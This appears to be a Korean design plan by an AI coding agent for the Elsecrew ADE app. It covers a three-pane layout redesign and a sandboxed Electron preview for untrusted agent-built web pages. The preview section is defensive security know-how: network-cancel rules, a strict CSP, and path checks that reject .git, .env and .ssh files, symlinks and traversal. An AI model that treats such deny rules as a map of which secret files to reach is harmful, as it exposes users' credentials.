> **제안 문서(아직 사실 아님).** 원본: `~/Documents/elsecrew-ade-layout-plan-2026-11-25/` (2026-11-25). 목업(`mockup/`)은 저장소에 넣지 않았고, 본문의 `mockup/…` 경로는 그 폴더 기준이다. 1차-가(믿을 수 있는 표시)는 2026-11-25 `orca/ade-phase1a`에서 구현됐다(`docs/history.md`). 현재 동작은 `docs/architecture.md`·`docs/history.md`를 기준으로 한다. 2장 미리보기의 P1·P2·P4는 2026-11-26 `orca/ade-preview-backend`에서 `ELSECREW_PREVIEW=1` 뒤로 구현됐고 T3(DNS 미리 찾기)는 실제 누출로 확인돼 앱 전체 Blink 설정으로 막았다. P3 화면과 기본 활성화는 2026-11-26 `orca/ade-preview-ui`에서 구현했다(`docs/architecture.md` "결과 미리보기").

# Elsecrew ADE 1차-나 — 레이아웃 재배치 설계와 구현 계획

- 작성: 2026-11-25 · Claude Opus 5.5 (claude-opus-5-5) · Orca 작업 `task_2b36626ab8bf`
- 기준: `feature/ade` HEAD `01d85814`(이 계획의 워크트리 `orca/ade-layout-plan`도 같은 커밋). 코드·문서·커밋은 바꾸지 않았고 앱도 띄우지 않았습니다.
- 입력: 진단 보고서 `~/Documents/elsecrew-ade-diagnosis-2026-11-25/REPORT.md`(D1·D5·D7·D8·F1·F12·4장 1차 완료 기준), 같은 폴더의 스크린샷·방향 A/B/C 목업, 저장소 `src/m5/`·`electron/main.ts`·`src/m5/contracts/`.
- 주인님 결정(2026-11-25): **A(작업 관제실) 뼈대 + 오른쪽 첫 탭 C(결과 미리보기) + 왼쪽 B(상태별 묶음)**.
- 전제: 같은 시기에 1차-가(상태 표시 통일, 메시지 렌더, 문구 정리 등)가 원래 ADE 워크스페이스에서 구현됩니다. 이 계획은 **1차-가가 `feature/ade`에 들어간 뒤 그 위에서 시작**한다고 가정합니다(3.4절 충돌 표).

결과물 파일:

| 파일 | 내용 |
| --- | --- |
| `PLAN.md` | 이 문서 |
| `mockup/layout-acb.html` | 반응형 목업 하나. 주소 끝에 `#show-sheet`(넓은 검토 시트), `#show-drawer`(1100px 미만 오른쪽 서랍)를 붙이면 상태가 바뀝니다 |
| `mockup/layout-1280x768.png` | 기본 창(진행 중 + 확인 요청) |
| `mockup/layout-1680x945.png` | 넓은 창 |
| `mockup/layout-1024x768.png`, `layout-1024x768-drawer.png` | 1100px 미만(왼쪽 레일, 오른쪽 서랍 닫힘/열림) |
| `mockup/layout-1280x768-sheet.png` | 바뀐 내용·편집기를 크게 보는 검토 시트 |

---

## 1. 화면 설계

### 1.1 지금 구조와 바꾸는 이유 (코드 기준)

- 지금 작업대는 `WorkbenchDock`(`src/m5/workbench-dock.tsx`)이 `defaultDockLayout()`(`src/m5/dock-layout.ts:6`) 트리를 그립니다: 왼쪽 22%에 `chats/files/changes` 탭, 나머지의 60%가 `editor`, 40%가 `conversation`. 1280px에서 대화 칸은 약 420px이고, 그 안에서 결과 막대와 입력칸이 높이를 먹어 대화 높이가 419px입니다(D1).
- 그 왼쪽에 프로젝트 레일(`ProjectCatalog rail`, `workbench.tsx:523`)이 따로 있어서, 실제로는 **레일 + 3단 = 4단**입니다(스크린샷 24).
- 드래그 재배치·숨김 UI는 이미 지웠고(architecture 2026-11-10), 레이아웃은 저장도 하지 않습니다(`useState(() => selectDockTab(defaultDockLayout(), "files"))`). **dock 트리 기능은 사실상 고정 3단을 그리는 데만 쓰이고 있어서, 고정 3영역 레이아웃으로 바꿔도 잃는 사용자 기능이 없습니다.**

### 1.2 영역 구성

```
┌ 상단 막대 44px: Elsecrew · 프로젝트 › 작업 이름 ·········· (서랍 토글*) 작업 시간 · 알림 · 도움말 ┐
├──────────────┬──────────────────────────────────────┬─────────────────────────────┤
│ 왼쪽          │ 가운데 (작업 이야기)                      │ 오른쪽 (결과)                   │
│ 프로젝트 선택   │ 상태 배지 · 시작 시각 · 경과              │ [미리보기][변경 N][파일][기록]   │
│ ＋ 새 작업      │ 목표(H1) — 첫 사용자 메시지는 이것 하나     │                              │
│              │ ─ 단계 진행 막대 (스크롤해도 위에 붙음) ─    │  탭 내용                       │
│ ● 확인 필요    │ 총괄 카드 (요약 + 자세히)                 │                              │
│ ● 일하는 중    │ 개발 카드 (요약 · 바뀐 파일 칩)            │                              │
│ ● 검토 기다림  │ 검증 카드 (지금 하는 일 · 실시간 활동)       │                              │
│ ● 끝남 (접힘)  │ 내 추가 요청 말풍선                       │                              │
│              │ ┌ 확인 요청 카드 (대기 중이면 입력칸 위 고정) ┐│ ┌ 결과 상자 ─────────────────┐ │
│              │ └ 입력칸 · 작업 중단 · 보내기 ───────────┘│ │ 상태 문장 · 내 폴더에 넣기  │ │
├──────────────┴──────────────────────────────────────┴─────────────────────────────┤
│ 상태 표시줄 24px: Claude/Codex 사용량                                                │
└────────────────────────────────────────────────────────────────────────────────────┘
* 서랍 토글은 1100px 미만에서만 보임
```

**왼쪽 — 상태별 작업 목록 (B)**

- 맨 위에 현재 프로젝트 선택 버튼(색 + 첫 글자 아이콘, 이름, ▾)을 둡니다. 지금의 프로젝트 레일을 이 버튼의 팝오버로 접습니다. **1차에서 전환 동작은 지금과 같습니다**(열린 프로젝트를 닫아야 다른 프로젝트를 엽니다). 닫지 않고 바로 바꾸기와 모든 프로젝트 수신함은 2차(F2) 범위입니다.
- 그 아래에 '새 작업' 버튼을 둡니다. 강조색은 쓰지 않습니다(D5: 강조색은 "지금 해야 할 한 가지"에만).
- 묶음 순서와 기준(상태 값은 1차-가의 단일 상태 기계를 그대로 읽습니다):

| 묶음 | 포함 상태 | 펼침 | 줄 아래 한 줄 |
| --- | --- | --- | --- |
| 확인이 필요해요 | 권한 대기, `waitingForUser`, `needsAttention`, `recoveryRequired` | 항상 | 무엇을 기다리는지("검증이 허락을 기다려요") |
| 지금 일하는 중 | `preparing`, `running`, `stopping`, `applying` | 항상 | 담당 · 경과("개발 · 2분째") |
| 검토 기다림 | `reviewReady` 중 아직 합치지/반영하지 않음, 반영 뒤 또 바뀜 | 항상 | "파일 4개 바뀜 · 어제" |
| 끝남 | 합침, 반영됨, `completed`, `canceled`, `discarded` | 기본 접힘 | "내 폴더에 들어감 · 어제" |

- 빈 묶음은 숨깁니다(작업이 한두 개인 초보자에게 빈 칸이 보이지 않게). 묶음 안 순서는 최근 활동 순입니다.
- 작업 지우기(×)는 줄에 마우스를 올리면 나타나는 ⋯ 메뉴로 옮깁니다.

**가운데 — 작업 이야기 (A)**

위에서 아래로:

1. **머리말**: 상태 배지(1차-가 상태 색), 시작 시각·경과, 목표 H1. 목표가 첫 사용자 메시지이므로 첫 메시지를 말풍선으로 또 그리지 않습니다(D4①).
2. **단계 진행 막대**: 스크롤해도 맨 위에 붙어 있습니다(높이 약 52px).
   - 칸 하나가 실행(run) 하나입니다: 역할, 상태, 걸린 시간.
   - 지금 실행 중인 칸은 파란 테두리로 표시합니다.
   - 마지막 칸은 점선으로 "다음 · 총괄이 정해요"를 보여 줍니다.
   - 단계가 5개를 넘으면 앞 단계는 "+3"으로 접습니다.
   - **1차에는 구조화된 계획이 없습니다**(F3은 2차). 그래서 미리 정한 4칸(계획/개발/검증/정리)이 아니라 **실제로 지나간 실행 순서**를 그립니다. 열린 질문 Q6을 보세요.
   - 실행과 실행 사이에 아무 칸도 실행 중이 아니면 마지막 칸이 "총괄이 결과를 읽고 다음 담당을 정하는 중"으로 바뀝니다. 이것으로 F1의 "10초 넘게 무엇을 하는지 모르는 구간"을 없앱니다.
3. **팀원 카드**: 실행 하나 = 카드 하나입니다. 지금의 `AgentRuns` 실행 카드와, 같은 `runId`로 게시된 `TeamMessageRow` 보고를 **한 카드로 합칩니다**.
   - 머리줄: 역할, 상태, 시각.
   - 본문: 보고 요약 2~3문장. 렌더러와 요약 규칙은 1차-가 결과를 씁니다.
   - 바뀐 파일 칩: 실행별 파일 목록 데이터가 renderer에 있을 때만 보여 줍니다(3.2 L4b 참고).
   - "보고 전체 보기 ▸"를 누르면 본문을 펼칩니다.
   - 공급자·모델·실행 ID·종료 코드·진단 도움말은 카드에서 빼서 오른쪽 '기록' 탭으로 옮깁니다(D4③).
4. **지금 일하는 팀원 카드**는 실시간 활동 목록(`AgentOutputPanel`, 한국어 동사는 1차-가)을 펼친 상태로 보여 줍니다. 끝난 카드는 접힙니다.
5. **확인 요청 카드**(`ApprovalCard`): 요청이 대기 중인 동안에는 **입력칸 바로 위에 고정**합니다. 스크롤 위치와 상관없이 보이게 하려는 것이고, 목업 1280에서는 흐름 안에 두면 접힌 아래로 밀려났습니다.
   - 요청 내용(명령·경로)과 이유는 1차-가 D13 결과로 카드 첫 줄에 나옵니다.
   - 응답하거나 요청이 사라지면 흐름 안의 해당 팀원 카드 아래로 기록이 남습니다.
   - 강조색은 '한 번 허용'에만 씁니다.
6. **입력칸**(`FollowupComposer`)은 바닥에 고정합니다. '작업 중단'을 옆에 둡니다.
   - 진행 중 지시 추가(F4)는 2차이므로, 1차에서는 지금처럼 진행 중이면 비활성이고 안내만 "지금 단계가 끝나면 보낼 수 있어요"로 바꿉니다.
7. 복구·오류 알림(`m5-error`, 복구 필요)은 머리말 바로 아래, 단계 막대 위에 둡니다(지금 `TeamTimeline` 앞부분과 같은 위치).
8. 가운데 내용은 최대 폭 760px(1500px 이상에서는 820px)로 가운데 정렬합니다. 글 줄 길이를 읽기 좋게 유지하려는 것입니다.

**오른쪽 — 결과 (C 미리보기 + 변경 · 파일 · 기록)**

| 탭 | 내용 | 기존 코드 출처 |
| --- | --- | --- |
| 미리보기 (첫 탭) | 작업 공간의 정적 웹 결과. 넓게/좁게(390px), 다시 불러오기, "인터넷 차단" 표시, "읽기 전용" 틀 | 신규(2장) |
| 변경 N | 바뀐 파일 목록과 상태 문장("아직 내 폴더에 넣지 않았어요 / 넣었어요 / 넣은 뒤 새로 바뀐 파일 2개"). 파일을 누르면 넓은 검토 시트가 열림 | `m5-changes` aside의 `ChangeList`, `ChangesMergeStatus` |
| 파일 | 파일 찾기, 숨김 파일 보기, 트리. 파일을 누르면 검토 시트의 편집기 모드로 열림. `.html` 파일에는 "미리보기로 열기" | `m5-files` aside의 `FileSearch`, `VirtualFileList` |
| 기록 | 이번 작업의 실행 목록(순서·역할·공급자·모델·시작·걸린 시간·종료 결과·실행 ID·진단 도움말), "종료된 이전 실행 N개", 개발용 fixture 실행 버튼 | `AgentRuns`의 `details`/이전 실행, `TeamTimeline` 바닥의 demo 컨트롤 |

- **결과 상자**는 탭과 상관없이 오른쪽 패널 바닥에 늘 보입니다. 합치기와 반영을 하는 **유일한 위치**입니다(D4④). 지금의 결과 막대(`m5-result-bar`), 변경 패널의 `ChangesMergeStatus` 합치기 진입, `ApplyLatest`의 반영 버튼을 여기로 모읍니다.
  - git 작업: `ChatWorkspaceMerge`
  - 사본 작업: `ApplyLatest` 확인 대화상자
  - 버리기: `ChatWorkspaceDiscard`
- 미리보기 결과가 없는 작업(스크립트·문서만 바꾼 작업)은 첫 탭이 "이 작업에는 화면으로 볼 결과가 없어요"와 '변경 보기' 버튼을 보여 줍니다. 작업을 열 때 미리보기 대상이 없으면 처음부터 '변경' 탭을 엽니다.
- 오른쪽 패널 왼쪽 경계는 끌어서 폭을 바꿀 수 있습니다(320px~화면의 50%). 키보드 ←/→도 지원하며, 값은 `localStorage`에 하나만 저장합니다.

### 1.3 편집기와 diff의 위치 — "넓은 검토 시트"

- 편집기(Monaco)와 diff(Monaco diff, '전체 변경 보기')는 **평소 화면에서 내리고, 필요할 때만 여는 넓은 시트**로 옮깁니다(목업 `layout-1280x768-sheet.png`).
  - 시트는 가운데와 오른쪽을 덮습니다. 왼쪽 작업 목록은 남겨 두어 다른 작업으로 바로 갈 수 있게 합니다.
  - 1100px 미만에서는 레일 오른쪽 전체를 덮습니다.
  - 시트 머리에 `[바뀐 내용 | 편집기]` 전환, `나란히/한 줄로`, `닫기(Esc)`가 있습니다.
  - '바뀐 내용' 모드: 왼쪽 220px에 파일 목록, 오른쪽에 `MonacoDiff` 나란히 보기를 둡니다. 지금의 `AllChanges`, `DiffDetails`를 씁니다.
  - '편집기' 모드: 지금의 탭 목록, 편집기 머리, 저장/다시 불러오기, `EditorContent`.
- 여는 경로:
  - 변경 탭 파일 → 시트(바뀐 내용, 해당 파일)
  - 팀원 카드의 파일 칩 → 시트(바뀐 내용, 해당 파일)
  - 파일 탭 → 시트(편집기)
  - 결과 상자 '변경 보기' → 시트(전체)
- **Monaco와 저장하지 않은 초안을 지키는 방법**: 지금 dock은 "Stable panel parents preserve Monaco and unsaved drafts"(`workbench-dock.tsx:46`) 방식으로 패널을 지우지 않고 `hidden`만 바꿉니다. 시트도 **처음 연 뒤에는 DOM에서 지우지 않고 숨김만** 하여 같은 성질을 유지합니다. 저장하지 않은 초안이 있으면 시트 닫기 버튼 옆에 ● 표시를 남깁니다.
- 오른쪽 패널(400px) 안에 Monaco를 넣지 않는 이유는 둘입니다. 진단에서 400px diff는 읽기 어렵다고 확인했습니다(A의 단점). 또 Monaco 인스턴스를 두 곳에 두면 G6 메모리 예산에 불리합니다.

### 1.4 창 크기별 규칙

| 구간 | 왼쪽 | 가운데 | 오른쪽 | 기타 |
| --- | --- | --- | --- | --- |
| **≥1500px** (예: 1680×945) | 264px | 나머지(1680에서 896px), 내용 최대 820px | 520px (미리보기가 넓어짐) | 목업 `layout-1680x945.png` |
| **1100~1499px** (기본 1280×768) | 240px | 나머지(1280에서 **640px = 50%**) | 400px | 목업 `layout-1280x768.png` |
| **820~1099px** (예: 1024, 960) | 56px 아이콘 레일: 프로젝트 아이콘, ＋, 상태 묶음 4개(개수 배지). 누르면 목록이 겹쳐 열림 | 레일을 뺀 전체 | **닫힌 서랍**. 상단 막대의 `[미리보기 · 변경 N · 파일 · 기록]` 토글로 최대 440px 서랍을 겹쳐 엶. 결과 상자는 서랍 안 | 목업 `layout-1024x768*.png`. D8 해결 |
| **<820px** (최소 640) | 레일 유지 | 전체 | 서랍이 화면 폭의 92% | 지금의 `m5-dock-narrow-note` 단일 탭 모드를 대체 |

- 1100px 미만에서 결과가 준비되면(검토 기다림) 상단 '변경' 토글에 초록 점을 띄웁니다. 합치기 버튼 자체는 서랍 안 결과 상자에만 둡니다.
- 기준 높이: 1280×768에서 상단 44 + 상태 표시줄 24를 빼면 가운데 열 높이는 700px입니다. 머리말은 스크롤과 함께 올라가고 단계 막대(52px)만 붙으므로, 입력칸(약 72px)을 빼면 **대화·타임라인이 보이는 높이는 약 576~600px**입니다. 지금은 419px입니다. 확인 요청이 고정된 동안에는 그만큼(약 170px) 줄어듭니다. 이 시간에는 확인 요청이 해야 할 한 가지이므로 의도한 동작입니다.
- 1차 완료 기준 측정법: "1280×768에서 가운데 열 폭 ≥ 50%, 가운데 열 높이 ≥ 600px"를 DOM `getBoundingClientRect`로 재고, 확인 요청이 없을 때 타임라인 스크롤 영역 높이(≥ 560px)도 함께 기록합니다.

### 1.5 상태별 화면 (1차-가 상태 기계 위에서)

| 작업 상태 | 가운데 | 오른쪽 기본 탭 | 결과 상자 |
| --- | --- | --- | --- |
| 초안·준비 중 | 목표 + "총괄이 계획을 세우는 중" 한 칸 | 미리보기(있으면) / 파일 | 숨김 |
| 진행 중 | 단계 막대 + 실행 카드 + 실시간 활동 | 미리보기 | "팀 작업이 끝나면 여기서 넣을 수 있어요" + 비활성 버튼 |
| 확인 필요 | 위 + 입력칸 위 확인 카드 | 유지 | 위와 같음 |
| 검토 기다림 | 마지막 총괄 카드에 "결과를 오른쪽에서 확인해 주세요" | 미리보기(있으면) / 변경 | "아직 내 폴더에 넣지 않았어요" + **강조색 '내 폴더에 넣기'**(git: main에 합치기 확인 / 사본: 반영 확인) + 버리기 |
| 합침 / 반영됨 | 마지막 카드 아래 "내 폴더에 들어갔어요" 한 줄 | 변경(흐리게, "이 작업에서 바꾼 파일") | "✓ 내 폴더에 들어갔어요" — 버튼 없음 |
| 반영 뒤 또 바뀜 | 추가 요청과 새 실행 카드 | 변경 | "넣은 뒤 새로 바뀐 파일 N개" + '다시 넣기' |
| 버림·중단 | 상태 한 줄 | 기록 | 숨김 |

- 문구는 예시입니다. 실제 문구는 1차-가의 D9 결과("내 폴더에 넣기" 등)를 따릅니다.
- 작업을 바꾸는 동안에는 이전 작업의 값을 보여 주지 않고 세 영역 모두 스켈레톤을 보여 줍니다(D3④). 상태 기계는 1차-가가 만들고, 1차-나는 그 'switching' 값을 받아 세 영역에 적용합니다.

### 1.6 키보드·접근성

- 랜드마크: `nav`(작업 목록), `main`(작업 진행), `complementary`(결과)
- 오른쪽 탭은 지금 dock 탭과 같은 roving tabindex(←/→/Home/End)를 씁니다.
- 시트: 열면 첫 파일로 초점을 옮기고, Esc로 닫으면 연 버튼으로 초점을 돌려줍니다. 시트가 열린 동안 뒤 영역에는 `inert`를 겁니다.
- 1차 단축키(F9 전체는 2차): 열린 질문이 아닌 기본값으로 다음 넷을 둡니다.
  - ⌘1·⌘2·⌘3: 왼쪽 목록·가운데 입력칸·오른쪽 패널로 초점 이동
  - ⌘\\: 오른쪽 패널(또는 서랍) 열고 닫기
  - Esc: 시트·서랍 닫기
  - ⌘N: 새 작업
- 단계 막대의 '지금' 칸, 확인 카드 등장, 상태 전환은 `aria-live="polite"` 한 곳으로만 알립니다. 지금은 `role=status`가 여러 개라 같은 말을 여러 번 읽습니다.

### 1.7 색·간격 (목업이 쓰는 토큰)

목업 `layout-acb.html`의 `:root`가 토큰 구조 초안입니다. 1단은 원시 팔레트(`--p-*`), 2단은 의미 토큰입니다.

- 면: `--bg-app/pane/raised/sunken/hover/selected`
- 선: `--line-subtle/default`
- 글자: `--text-primary/secondary/tertiary`
- 강조: `--action-*`
- 상태: `--status-running/attention/review/done/danger` + `*-bg`
- diff: `--diff-add/remove`
- 간격: `--space-1~6`(4/8/12/16/24/32)
- 모서리: `--radius-s/m/l`
- 글자 크기: `--text-xs~xl`
- 레이아웃 치수: `--left-w/--right-w/--center-max`

범위 결정은 3.5절에 있습니다.

---

## 2. 결과 미리보기(F12) 안전 설계

### 2.1 목표와 범위

- 목표: 팀이 작업 공간에 만든 **정적 웹 결과**(HTML/CSS/JS/이미지/글꼴)를 앱을 떠나지 않고 넓게·좁게 봅니다.
- 1차 범위에 넣지 않는 것:
  - 빌드나 개발 서버 실행(`npm run dev` 등은 명령 실행이 필요해 별도 안전 결정)
  - 에이전트가 브라우저를 쓰는 것(진단 F12, history 11-23: 에이전트 샌드박스는 브라우저를 못 띄움, 별도 결정)
  - 사용자 원본 폴더 미리보기
  - 외부 URL 열기
- 원칙: 미리보기 페이지는 **에이전트가 만든, 신뢰할 수 없는 코드**로 취급합니다. 앱 권한·인터넷·작업 공간 밖 파일 중 어디에도 닿지 못하게 하고, 쓰기 경로는 아예 만들지 않습니다.

### 2.2 구조

```
 renderer(앱 화면, 기존 창)                    main process                         sidecar (Rust)
 ─────────────────────────                   ─────────────────────────────         ──────────────────────
 PreviewTab                                   PreviewManager
  ├ 자리 표시 div ─ ResizeObserver ──IPC──▶ m5:preview:v1 {open|bounds|reload|      preview.resolve
  │   (x,y,w,h, 넓게/좁게, 가려짐 여부)          viewport|hide|close}  ─────────────▶  {projectId, chatId}
  │                                           │  ① 채팅의 살아 있는 작업 공간 확인         → workspaceIdentity,
  │                                           │  ② 무작위 토큰(128bit) → {projectId,      entry(index.html 후보)
  │                                           │     workspaceIdentity} 표 (메모리만)
  │                                           ▼
  │                                     WebContentsView (별도 프로세스)
  │                                      session = fromPartition("preview-<토큰>")   ← persist: 없음 = 메모리만
  │                                      URL  elsecrew-preview://<토큰>/index.html
  │                                      │ 모든 요청
  │                                      ▼
  │                                     previewSession.protocol.handle("elsecrew-preview")
  │                                      ├ URL 엄격 해석(토큰·경로)            ──────────▶  preview.readAsset
  │                                      ├ GET만, 응답 헤더 고정(CSP·nosniff·no-store)        {projectId, workspaceIdentity, path}
  │                                      └ 그 밖의 스킴·호스트는 webRequest로 취소   ◀──────────  bytes (≤5MiB, 허용 확장자,
  └ 가려질 때: view 숨김 + capturePage 정지 이미지                                     심볼릭 링크·점 파일·.git 거절)
```

**구성 결정과 이유**

| 결정 | 선택 | 버린 대안과 이유 |
| --- | --- | --- |
| 그릴 곳 | **`WebContentsView`**(Electron 43). main 창 위에 renderer가 알려 준 사각형으로 붙임 | `<iframe>`: 별도 partition을 줄 수 없고 app session·프로세스 정책을 공유합니다. 앱 CSP에 `frame-src`를 열어야 합니다. 주인님 조건(별도 partition)을 못 지킵니다. `<webview>`: 지금 `will-attach-webview`로 막고 있고(`main.ts:276`), 열면 공격면이 커집니다. 별도 `BrowserWindow`: 창 관리·포커스가 비개발자에게 혼란스럽습니다. |
| 세션 | `session.fromPartition("preview-" + 토큰)` — **`persist:` 없이 메모리 전용**, 작업 하나당 하나 | 공용 partition: 작업 사이에 localStorage·캐시가 섞입니다. 디스크 partition: 앱 데이터에 남습니다(Q2). |
| 파일 읽기 | **sidecar의 새 읽기 전용 메서드 `preview.readAsset`**. 작업 공간 주소 지정(`workspace-addressing-v1`)과 경로 검증을 이미 가진 쪽이 한다 | main이 `worktreePath`를 받아 `fs`로 직접 읽기: main에 새 파일 권한이 생기고, git/그림자 git/사본 작업 공간의 경로 차이를 다시 구현해야 합니다. 기존 `file.read`(`contracts/file-v1.ts`)는 이진 파일을 `classification: "binary"`로만 돌려주고 내용을 주지 않아 이미지·글꼴에 못 씁니다. |
| 출처(origin) | `elsecrew-preview://<토큰>/…` — 작업마다 다른 호스트 | `file://`: 디렉터리 전체 접근·다른 파일 탐색 위험. `http://127.0.0.1:port`: 로컬 서버가 다른 앱·페이지에 노출됩니다. |
| 스킴 권한 | `registerSchemesAsPrivileged`에 `{ standard: true, secure: true, supportFetchAPI: true, corsEnabled: false, allowServiceWorkers: false, bypassCSP: false, stream: false }`. **핸들러는 미리보기 session에만 등록** | 기본 session에 등록하면 앱 창도 미리보기 콘텐츠를 불러올 수 있게 됩니다. |

### 2.3 설정 목록 (구현 체크리스트)

**WebContentsView `webPreferences`**

| 설정 | 값 |
| --- | --- |
| `partition` | 위 메모리 partition |
| `sandbox` | `true` |
| `contextIsolation` | `true` |
| `nodeIntegration` | `false` |
| `nodeIntegrationInSubFrames` | `false` |
| `preload` | 없음 |
| `webSecurity` | `true` |
| `allowRunningInsecureContent` | `false` |
| `webviewTag` | `false` |
| `devTools` | `false`(개발 빌드만 환경변수로 허용) |
| `spellcheck` | `false` |
| `navigateOnDragDrop` | `false` |
| `safeDialogs` | `true` |
| `autoplayPolicy` | `'document-user-activation-required'` |
| `backgroundThrottling` | `true` |

**세션(생성 직후, 첫 로드 전에 모두 설정)**

- `setPermissionRequestHandler((_, __, cb) => cb(false))`, `setPermissionCheckHandler(() => false)`, `setDevicePermissionHandler(() => false)`, `setDisplayMediaRequestHandler(거절)`: 카메라·마이크·위치·알림·클립보드 읽기·MIDI·HID·USB·시리얼·화면 공유·파일 시스템 접근을 모두 거절합니다.
- `webRequest.onBeforeRequest({ urls: ["<all_urls>"] })`: `elsecrew-preview://<같은 토큰>/` 이외는 `cancel`. `data:`·`blob:`은 네트워크가 아니므로 허용합니다(이미지·worker용).
- `webRequest.onBeforeSendHeaders`/`onHeadersReceived`: 미리보기 스킴 외 응답은 없어야 하므로 관측만 하고, 들어오면 진단 기록을 남깁니다(회귀 탐지용).
- `setProxy({ mode: "fixed_servers", proxyRules: "http=127.0.0.1:9;https=127.0.0.1:9;socks=127.0.0.1:9" })`: 이중 방어입니다. webRequest가 놓친 요청도 연결되지 않습니다. 9번은 discard 포트이며 열린 서버가 없다는 전제입니다(검토 지점).
- `webContents.setWebRTCIPHandlingPolicy("disable_non_proxied_udp")`: WebRTC STUN/UDP로 webRequest를 우회하는 것을 막습니다. 프록시 무효와 결합하면 TCP도 실패합니다.
- `on("will-download", e => e.preventDefault())`
- `setSpellCheckerEnabled(false)`, `setUserAgent`에서 Electron·앱 버전을 빼고 일반 UA 사용(지문 최소화. 네트워크가 없으므로 의미는 작음)
- 닫을 때 `clearStorageData()` + `clearCache()` 뒤 view를 `close()`합니다. partition 객체는 프로세스 수명 동안 남으므로 같은 토큰을 다시 쓰지 않습니다.

**탐색·창**

- `setWindowOpenHandler(() => ({ action: "deny" }))`
- `will-navigate`, `will-redirect`, `will-frame-navigate`: 같은 토큰 출처가 아니면 막습니다. 바깥 링크를 막았으면 renderer에 "미리보기에서는 바깥 링크를 열 수 없어요"를 한 번 알립니다.
- `will-attach-webview`: 막습니다.
- `render-process-gone`, `unresponsive`: view를 버리고 "미리보기가 멈췄어요 · 다시 열기"를 보여 줍니다.
- `before-input-event`는 건드리지 않습니다. 앱 메뉴 단축키는 메뉴 수준이라 그대로 동작합니다.

**응답 헤더 (프로토콜 핸들러가 모든 응답에 고정)**

```
Content-Type: <확장자 표에서만 결정. 내용 추측 없음>
X-Content-Type-Options: nosniff
Cache-Control: no-store
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Referrer-Policy: no-referrer
Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), serial=(), hid=(), bluetooth=(), payment=(), clipboard-read=(), display-capture=()
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' data: blob:; connect-src 'self';
  worker-src 'self' blob:; frame-src 'self'; child-src 'self' blob:; object-src 'none'; base-uri 'self';
  form-action 'none'; manifest-src 'none'; upgrade-insecure-requests
```

- `'unsafe-inline'` 스크립트를 허용합니다. 에이전트가 만드는 정적 앱은 인라인 스크립트를 흔히 씁니다. 여기서 CSP는 XSS 방어가 아니라 **네트워크 차단의 이중 방어**입니다. `'unsafe-eval'`은 기본으로 거절하며, 필요한 결과물이 나오면 그때 정합니다.
- CSP는 HTML이 `<meta>`로 더 좁힐 수는 있지만 넓힐 수는 없습니다(헤더와 meta는 교집합).
- 핸들러는 GET/HEAD 외에는 405를 돌려줍니다. 쓰기 경로는 존재하지 않습니다.

**sidecar `preview.readAsset` 규칙**

- 입력: `{ projectId, workspaceIdentity, path }`. `workspaceIdentity`는 main이 토큰 표에서 꺼내며, renderer가 보낸 값을 쓰지 않습니다.
- 경로 검증:
  - 상대 경로만 허용합니다. NUL·`\`·`..`·빈 조각·`%2e/%2f/%5c` 인코딩(`serveAppAsset`과 같은 규칙)을 거절합니다.
  - **점으로 시작하는 조각(`.git`, `.env`, `.ssh` 등) 전부 거절**
  - 조각마다 `lstat`으로 **심볼릭 링크 거절**, 최종 대상은 일반 파일이어야 합니다.
  - 열린 파일의 실제 경로가 작업 공간 안인지 다시 확인합니다(TOCTOU 대비 `O_NOFOLLOW`).
- 확장자 허용 목록(그 밖은 404): `html htm css js mjs json map txt md svg png jpg jpeg gif webp avif ico bmp woff woff2 ttf otf mp3 wav ogg mp4 webm`.
  - 1차에서 `wasm`, `pdf`는 빼 둡니다.
- 크기: 파일 하나 5MiB(`FILE_MAX_BYTES_V1`와 같음), 한 번 불러오기(토큰 하나)당 합계 64MiB, 요청 수 2,000개를 넘으면 그 토큰을 닫습니다.
- 응답: 바이트(이진 허용). 프로토콜은 base64 조각 스트림이거나 별도 바이트 프레임입니다. 계약은 `contracts/preview-v1.ts` + `crates/elsecrew-protocol`에 새로 둡니다.
- 작업 공간이 버려졌거나(`discarded`) 복구 중이면 거절합니다. 합친 뒤 작업 공간이 정리됐으면 "결과 폴더가 정리돼 미리보기를 열 수 없어요"를 보여 줍니다.
- 실행 중인 에이전트와 동시에 읽는 것은 지금의 `file.read`와 같은 수준으로 허용합니다. 읽기 전용이고, 내용이 바뀌면 다시 불러올 때 반영됩니다.

**진입 파일 찾기(`preview.resolve`)**

- 작업 공간 루트의 `index.html`이 있으면 씁니다. 없으면 `public/index.html` → `dist/index.html` → `build/index.html` → `docs/index.html` 순서로 찾고, 첫 번째 것을 씁니다.
- 파일 탭의 `.html` 파일은 "미리보기로 열기"로 진입 파일을 바꿀 수 있습니다.
- 실행이 끝날 때마다(단계 막대의 칸 하나가 끝나면) "새 결과가 있어요 · 다시 불러오기" 띠를 띄웁니다. 자동 새로고침은 하지 않습니다. 사용자가 미리보기 안에서 입력 중일 수 있기 때문입니다.

**수명·자원 (G6 512MiB 유휴 예산 보호)**

- view는 **미리보기 탭이 보이고 진입 파일이 있을 때만** 만듭니다. 앱이 유휴이고 미리보기가 닫혀 있으면 추가 프로세스가 0개입니다.
- 다른 탭으로 가면 숨기고, 30초 뒤 닫습니다. 작업을 전환하면 바로 닫고 새 토큰을 씁니다(같은 작업으로 돌아와도 새 세션이므로 localStorage가 비어 있음 — Q2). 창을 최소화하거나 숨기면 숨기고, 앱 종료 시작(`quitCoordinator.onQuitStarted`)이면 즉시 닫고 대기 중인 sidecar 읽기를 취소합니다.
- 동시에 살아 있는 미리보기 view는 1개입니다.

**화면 겹침(z-order) — WebContentsView의 함정**

- `WebContentsView`는 renderer DOM 위에 그려집니다. 그래서 알림 팝오버, 대화상자, 넓은 검토 시트, 1100px 미만 서랍, 프로젝트 팝오버, 토스트가 미리보기 영역과 겹치면 **그 아래로 가려집니다.**
- 대응: renderer의 레이아웃 계층이 "미리보기 영역이 가려짐"을 하나의 상태(`previewObscured`)로 계산해 IPC로 보냅니다. main은 그동안 `setVisible(false)`로 view를 숨기고, 직전 `capturePage()` 정지 이미지를 자리 표시 div에 보여 줍니다. 겹침 원인 목록은 레이아웃 코드 한 곳에서 관리합니다.
- bounds IPC 값은 main이 검증합니다: 유한수, 창 content 크기 안, 최소 120×120.

**앱 IPC와의 분리**

- 미리보기에는 preload가 없으므로 `ipcRenderer` 자체가 없습니다.
